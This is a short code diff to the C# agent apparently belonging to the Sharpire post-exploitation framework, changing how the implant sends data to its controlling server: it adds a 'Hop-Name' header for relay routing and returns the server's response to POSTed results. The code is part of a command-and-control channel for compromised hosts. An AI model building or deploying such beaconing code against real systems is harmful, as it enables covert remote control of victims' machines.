@@ -138,8 +138,9 @@ namespace Sharpire
                     webClient.Headers.Add("Cookie", "session=" + Convert.ToBase64String(body));
                     return webClient.DownloadData(server + taskUri);
                 }
-                webClient.UploadData(server + taskUri, "POST", body);
-                return null;
+                if (hop != null && hop.Length > 0)
+                    webClient.Headers.Add("Hop-Name", Encoding.UTF8.GetString(hop));
+                return webClient.UploadData(server + taskUri, "POST", body);
             }
             catch (WebException)
             {
